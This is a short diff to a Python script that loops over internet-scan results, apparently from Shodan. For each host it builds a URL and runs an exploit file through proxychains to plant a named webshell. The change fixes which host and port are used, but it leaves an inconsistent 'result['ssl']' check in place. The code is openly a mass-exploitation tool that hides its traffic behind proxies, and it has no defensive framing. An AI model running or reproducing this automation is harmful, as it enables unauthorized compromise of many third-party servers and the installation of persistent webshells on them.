@@ -32,9 +32,9 @@ for service in result['matches']:
     # Need to add the check on services in order to get the right port	
     try:
 	if result['ssl']:
-        	url = "https://" + result['ip_str'].rstrip() + ":" + str(result['port'])	
+        	url = "https://" + service['ip_str'].rstrip() + ":" + str(service['port'])	
 	except:
-		url = "http://" + result['ip_str'].rstrip() + ":" + str(result['port'])
+		url = "http://" + service['ip_str'].rstrip() + ":" + str(service['port'])
 
     try:
         result = subprocess.Popen("proxychains python3 " + exploitFile +" "+ url + " " + webshellName, shell=True, stdout=subprocess.PIPE, cwd=workingDir)
